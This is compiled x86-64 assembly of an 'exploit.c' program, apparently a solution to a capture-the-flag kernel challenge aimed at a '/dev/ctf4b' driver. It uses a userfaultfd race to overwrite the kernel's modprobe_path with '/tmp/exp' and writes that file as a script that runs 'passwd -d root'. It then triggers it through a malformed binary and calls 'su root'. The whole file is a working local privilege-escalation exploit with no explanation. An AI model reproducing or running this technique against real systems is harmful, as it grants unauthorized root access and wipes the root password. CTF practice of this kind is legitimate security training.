	.file	"exploit.c"
	.text
	.globl	MODULE_BASE
	.section	.rodata
	.align 8
	.type	MODULE_BASE, @object
	.size	MODULE_BASE, 8
MODULE_BASE:
	.quad	-1073741824
	.globl	GLOBAL_MSG_ADDR
	.align 8
	.type	GLOBAL_MSG_ADDR, @object
	.size	GLOBAL_MSG_ADDR, 8
GLOBAL_MSG_ADDR:
	.quad	-1073733280
	.globl	MODPROBE_PATH
	.align 8
	.type	MODPROBE_PATH, @object
	.size	MODPROBE_PATH, 8
MODPROBE_PATH:
	.quad	-2113216896
	.globl	ctf4b_buf
	.data
	.align 32
	.type	ctf4b_buf, @object
	.size	ctf4b_buf, 256
ctf4b_buf:
	.string	"/tmp/exp"
	.zero	247
	.globl	fd
	.bss
	.align 4
	.type	fd, @object
	.size	fd, 4
fd:
	.zero	4
	.text
	.globl	panic
	.type	panic, @function
panic:
.LFB6:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	_exit@PLT
	.cfi_endproc
.LFE6:
	.size	panic, .-panic
	.section	.rodata
	.align 8
.LC0:
	.string	"Failed to mmap memory for fault handler"
.LC1:
	.string	"Poll failed"
.LC2:
	.string	"Poll error or hangup"
.LC3:
	.string	"Failed to read from uffd"
.LC4:
	.string	"Unexpected event type"
.LC5:
	.string	"[+] Handling userfaultfd..."
	.align 8
.LC6:
	.string	"Failed to copy memory to page fault address"
	.align 8
.LC7:
	.string	"[+] Page fault handled successfully"
	.text
	.type	fault_handler, @function
fault_handler:
.LFB7:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$144, %rsp
	movq	%rdi, -136(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	-136(%rbp), %rax
	movq	%rax, -120(%rbp)
	movl	$0, %r9d
	movl	$-1, %r8d
	movl	$34, %ecx
	movl	$3, %edx
	movl	$4096, %esi
	movl	$0, %edi
	call	mmap@PLT
	movq	%rax, -112(%rbp)
	cmpq	$-1, -112(%rbp)
	jne	.L3
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L3:
	movq	$0, -104(%rbp)
	movq	-120(%rbp), %rax
	movl	%eax, -104(%rbp)
	movw	$1, -100(%rbp)
.L10:
	leaq	-104(%rbp), %rax
	movl	$-1, %edx
	movl	$1, %esi
	movq	%rax, %rdi
	call	poll@PLT
	testl	%eax, %eax
	jns	.L4
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L4:
	movzwl	-98(%rbp), %eax
	cwtl
	andl	$8, %eax
	testl	%eax, %eax
	jne	.L5
	movzwl	-98(%rbp), %eax
	cwtl
	andl	$16, %eax
	testl	%eax, %eax
	je	.L6
.L5:
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L6:
	movq	-120(%rbp), %rax
	movl	%eax, %ecx
	leaq	-80(%rbp), %rax
	movl	$32, %edx
	movq	%rax, %rsi
	movl	%ecx, %edi
	call	read@PLT
	cmpq	$32, %rax
	je	.L7
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L7:
	movzbl	-80(%rbp), %eax
	cmpb	$18, %al
	je	.L8
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L8:
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	movq	$-2113216896, %rax
	movq	$-1073733280, %rdx
	subq	%rdx, %rax
	movq	%rax, %rdx
	movl	fd(%rip), %eax
	movl	$307201, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	ioctl@PLT
	leaq	ctf4b_buf(%rip), %rax
	movq	%rax, -96(%rbp)
	movb	$16, -88(%rbp)
	movq	-96(%rbp), %rax
	movq	-88(%rbp), %rdx
	movq	-112(%rbp), %rcx
	movq	%rax, (%rcx)
	movq	%rdx, 8(%rcx)
	movq	-112(%rbp), %rax
	movq	%rax, -40(%rbp)
	movq	-64(%rbp), %rax
	andq	$-4096, %rax
	movq	%rax, -48(%rbp)
	movq	$4096, -32(%rbp)
	movq	$0, -24(%rbp)
	movq	$0, -16(%rbp)
	movq	-120(%rbp), %rax
	movl	%eax, %ecx
	leaq	-48(%rbp), %rax
	movq	%rax, %rdx
	movl	$3223890435, %eax
	movq	%rax, %rsi
	movl	%ecx, %edi
	movl	$0, %eax
	call	ioctl@PLT
	testl	%eax, %eax
	jns	.L9
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L9:
	leaq	.LC7(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	jmp	.L10
	.cfi_endproc
.LFE7:
	.size	fault_handler, .-fault_handler
	.section	.rodata
.LC8:
	.string	"Failed to create userfaultfd"
	.align 8
.LC9:
	.string	"Failed to set up userfaultfd API"
	.align 8
.LC10:
	.string	"Failed to register memory range with userfaultfd"
	.align 8
.LC11:
	.string	"Failed to create fault handler thread"
	.text
	.globl	setup_uffd
	.type	setup_uffd, @function
setup_uffd:
.LFB8:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$112, %rsp
	movq	%rdi, -104(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$526336, %esi
	movl	$323, %edi
	movl	$0, %eax
	call	syscall@PLT
	movq	%rax, -88(%rbp)
	cmpq	$0, -88(%rbp)
	jns	.L13
	leaq	.LC8(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L13:
	pxor	%xmm0, %xmm0
	movaps	%xmm0, -80(%rbp)
	movq	%xmm0, -64(%rbp)
	movq	$170, -80(%rbp)
	movq	-88(%rbp), %rax
	movl	%eax, %ecx
	leaq	-80(%rbp), %rax
	movq	%rax, %rdx
	movl	$3222841919, %eax
	movq	%rax, %rsi
	movl	%ecx, %edi
	movl	$0, %eax
	call	ioctl@PLT
	testl	%eax, %eax
	jns	.L14
	leaq	.LC9(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L14:
	pxor	%xmm0, %xmm0
	movaps	%xmm0, -48(%rbp)
	movaps	%xmm0, -32(%rbp)
	movq	-104(%rbp), %rax
	movq	%rax, -48(%rbp)
	movq	$4096, -40(%rbp)
	movq	$1, -32(%rbp)
	movq	-88(%rbp), %rax
	movl	%eax, %ecx
	leaq	-48(%rbp), %rax
	movq	%rax, %rdx
	movl	$3223366144, %eax
	movq	%rax, %rsi
	movl	%ecx, %edi
	movl	$0, %eax
	call	ioctl@PLT
	testl	%eax, %eax
	jns	.L15
	leaq	.LC10(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L15:
	movq	-88(%rbp), %rdx
	leaq	fault_handler(%rip), %rsi
	leaq	-96(%rbp), %rax
	movq	%rdx, %rcx
	movq	%rsi, %rdx
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_create@PLT
	testl	%eax, %eax
	je	.L18
	leaq	.LC11(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L18:
	nop
	movq	-8(%rbp), %rax
	subq	%fs:40, %rax
	je	.L17
	call	__stack_chk_fail@PLT
.L17:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE8:
	.size	setup_uffd, .-setup_uffd
	.section	.rodata
	.align 8
.LC12:
	.string	"[+] Triggering win function..."
.LC13:
	.string	"w"
.LC14:
	.string	"/tmp/exp"
.LC15:
	.string	"Failed to create /tmp/exp"
.LC16:
	.string	"#!/bin/sh\n"
.LC17:
	.string	"passwd -d root\n"
	.align 8
.LC18:
	.string	"Failed to set permissions on /tmp/exp"
.LC19:
	.string	"wb"
.LC20:
	.string	"/tmp/fuge"
.LC21:
	.string	"Failed to create /tmp/fuge"
	.align 8
.LC22:
	.string	"Failed to set permissions on /tmp/fuge"
.LC23:
	.string	"/bin/sh -c \"su root\""
	.text
	.globl	win
	.type	win, @function
win:
.LFB9:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	leaq	.LC12(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	leaq	.LC13(%rip), %rdx
	leaq	.LC14(%rip), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	fopen@PLT
	movq	%rax, -8(%rbp)
	cmpq	$0, -8(%rbp)
	jne	.L20
	leaq	.LC15(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L20:
	movq	-8(%rbp), %rax
	leaq	.LC16(%rip), %rdi
	movq	%rax, %rcx
	movl	$10, %edx
	movl	$1, %esi
	call	fwrite@PLT
	movq	-8(%rbp), %rax
	leaq	.LC17(%rip), %rdi
	movq	%rax, %rcx
	movl	$15, %edx
	movl	$1, %esi
	call	fwrite@PLT
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	fclose@PLT
	leaq	.LC14(%rip), %rax
	movl	$493, %esi
	movq	%rax, %rdi
	call	chmod@PLT
	testl	%eax, %eax
	jns	.L21
	leaq	.LC18(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
.L21:
	leaq	.LC19(%rip), %rdx
	leaq	.LC20(%rip), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	fopen@PLT
	movq	%rax, -8(%rbp)
	cmpq	$0, -8(%rbp)
	jne	.L22
	leaq	.LC21(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L22:
	movq	-8(%rbp), %rax
	movq	%rax, %rsi
	movl	$-1, %edi
	call	fputc@PLT
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	fclose@PLT
	leaq	.LC20(%rip), %rax
	movl	$511, %esi
	movq	%rax, %rdi
	call	chmod@PLT
	testl	%eax, %eax
	jns	.L23
	leaq	.LC22(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
.L23:
	leaq	.LC20(%rip), %rax
	movq	%rax, %rdi
	call	system@PLT
	leaq	.LC23(%rip), %rax
	movq	%rax, %rdi
	call	system@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	win, .-win
	.section	.rodata
.LC24:
	.string	"/dev/ctf4b"
.LC25:
	.string	"Failed to open device"
.LC26:
	.string	"Failed to mmap memory"
	.text
	.globl	main
	.type	main, @function
main:
.LFB10:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	leaq	.LC24(%rip), %rax
	movl	$2, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, fd(%rip)
	movl	fd(%rip), %eax
	testl	%eax, %eax
	jns	.L25
	leaq	.LC25(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L25:
	movl	$0, %r9d
	movl	$-1, %r8d
	movl	$34, %ecx
	movl	$3, %edx
	movl	$4096, %esi
	movl	$0, %edi
	call	mmap@PLT
	movq	%rax, -8(%rbp)
	cmpq	$-1, -8(%rbp)
	jne	.L26
	leaq	.LC26(%rip), %rax
	movq	%rax, %rdi
	call	panic
.L26:
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	setup_uffd
	movl	fd(%rip), %eax
	movq	-8(%rbp), %rdx
	movl	$307456, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	ioctl@PLT
	call	win
	movl	$0, %eax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE10:
	.size	main, .-main
	.ident	"GCC: (GNU) 15.1.1 20250425"
	.section	.note.GNU-stack,"",@progbits
